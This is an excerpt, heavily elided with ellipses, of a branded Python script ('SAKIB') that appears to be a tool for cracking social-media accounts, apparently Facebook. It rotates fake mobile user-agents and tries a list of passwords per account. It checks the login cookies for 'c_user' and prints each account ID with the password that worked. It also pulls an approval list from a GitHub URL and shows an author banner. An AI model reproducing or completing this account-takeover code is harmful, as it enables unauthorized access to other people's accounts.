...
ha = current.day
today = date.today()
#SAKIB2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-SAKIB/1.2.0 OPN-B'
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/Sakibbhai123/premium.py/blob/main/Approval.txt').text
        ff=open('show.txt','w')
...
\033[1;32m[-] GITHUB    :\033[1;32m SAKIB-CYBER-143
\033[1;32m[-] FACEBOOK  :\033[1;32m MD NAJMUS SAKIB
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS SAKIB BRAND\033[;0m\033[1;91m═══>\033[1;92m{P}""")
        ...
        for ps in pwx:
           ...
           'user-agent': ff}
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print('\033[1;92m[SAKIB-OK🌻] '+uid+' | '+ps+'\033[0;97m')
                ...
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mSAKIB","\x1b[1;92mSAKIB","\x1b[1;93mSAKIB","\x1b[1;94mSAKIB","\x1b[1;95mSAKIB","\x1b[1;96mSAKIB","\x1b[1;97mSAKIB","\x1b[1;91mSAKIB","\x1b[1;92mSAKIB","\x1b[1;93mSAKIB","\x1b[1;94mSAKIB","\x1b[1;95mSAKIB","\x1b[1;96mSAKIB"])
